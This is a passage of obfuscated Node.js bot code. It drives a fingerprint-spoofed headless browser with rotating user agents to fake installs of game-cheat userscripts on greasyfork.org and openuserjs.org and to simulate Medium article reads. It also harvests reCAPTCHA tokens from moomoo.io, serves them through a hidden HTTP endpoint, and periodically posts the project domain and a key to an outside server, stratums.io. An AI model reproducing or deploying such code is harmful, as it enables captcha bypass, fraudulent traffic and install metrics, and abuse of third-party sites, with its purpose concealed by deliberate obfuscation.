      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': Z(0x1b, 'WsZ^') + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + a0(0xc) + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + Z(0x20, '%U$v') + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a0(0x9) + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + Z(0x19, 'himP') + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    a0(0xf) + 'eacon.org',
    Z(0x0, 'sfh%') + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + Y(0x8),
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + a0(0xb) + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    a0(0x11) + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0xc72 * -0x1 + 0x2 * 0x9e0 + -0x2032
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a2 = b,
      a1 = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path')['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), i = new f['Builder']()[a1(0x22) + a2(0x13, 'M1*V') + 'er'](-0xb47 * 0x2 + 0x1d39 + -0x6ab)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](h);
    let j;
    u:
      for (;;)
        try {
          let m = await async function n() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (u) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (v) {}
            if (!p)
              return await randomWait(), await n();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (w) {
              if (!p)
                return await randomWait(), await n();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && i['deviceDesc' + 'riptor'](m), j = await i['launch']();
          break u;
        } catch (p) {
          warn(p), await randomWait();
        }
    const k = j['userAction'];
    log('browser\x20la' + 'unched');
    const l = j['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(l, k);
    }, -0x21a5 + 0x260 * -0x5 + 0x68f * 0x7), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(l, k);
    }, -0x1 * -0xab5 + -0x7e3 * -0x4 + -0x29dd * 0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const u = await l['createInco' + 'gnitoBrows' + 'erContext'](),
          v = await u['newPage']();
        for (;;) {
          let w = -0x1454 + -0x1ada + -0x29f * -0x12;
          if (await v['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](x => w++), await randomWait(), w)
            return await v['close'](), await u['close'](), await q();
          for (let x = 0x308 * -0x6 + -0xbfa + -0x15f * -0x16; x < getRandomInt(0x1 * 0x685 + 0x3 * 0xb9b + -0x2955, 0x1 * 0xe51 + 0x1447 * 0x1 + -0x2293); x++)
            await v['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x207 * 0xad + 0x6cbd + 0x1dc5e);
        }
      }();
    }, 0x2e0 + -0x1 * 0x7a9 + -0x1 * -0x52d), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await l['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x3 * -0x5b4 + 0x1c10 + -0xaf4;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x12c9 + 0xca4 + 0x625, -0x1a45 + 0x1b * 0xf3 + 0xd6)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x5c * -0x236 + 0x48ec + 0xf7ac);
    }, -0x13e1 + -0x11 * -0x3e + 0x1027), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      !async function u() {
        try {
          let v = 0x4 * -0x538 + 0xdd7 + -0x709 * -0x1;
          const w = await l['createInco' + 'gnitoBrows' + 'erContext'](),
            x = await w['newPage']();
          if (x['on']('pageerror', function(y) {}), x['on']('error', function(y) {}), await x['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](y => v++), v)
            return await x['close'](), await w['close'](), u();
        } catch (y) {}
        return await page['close'](), await context['close'](), u();
      }();
    }, -0xea0 + 0x2e3 * -0x6 + 0x2056);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x59 * -0x7 + 0x1c65 + -0x192e);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e[Z(0xd, 'sfh%')](process['env']['PORT'] || 0x13fd + 0x1ee8 + -0x1355);
}
doFlags['doOUJS'] && ((async () => {
  async function f() {
    const a4 = d,
      a3 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1402 + -0x55 * -0x4 + -0x1555) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x44f * 0x2 + -0x1d7 + 0xa76));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x11 * 0x121 + 0x2 * 0x382 + 0xc2d, D['indexOf']('\x20'));
        return B ? E['slice'](-0x678 + 0x1150 + 0x4 * -0x2b6, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0xe67 + -0xb * -0x2cf + 0x39 * -0x1c),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x3 * -0xa46 + -0x1459 + -0x233 * -0xd),
      'headers': {
        'host': a3(0x4, '887M') + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': a4(0x18)
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x146b + 0x1497 + -0x2c; k < -0x1939 + 0x143d * 0x1 + -0xa * -0x80; k++)
    setTimeout(f, (-0x33 * -0x21d + -0x113fe + 0x19297) * k * getRandomInt(-0x1c05 + -0x22f7 + -0x2b * -0x177, 0x1aea + 0x11d0 + -0x2cb7));
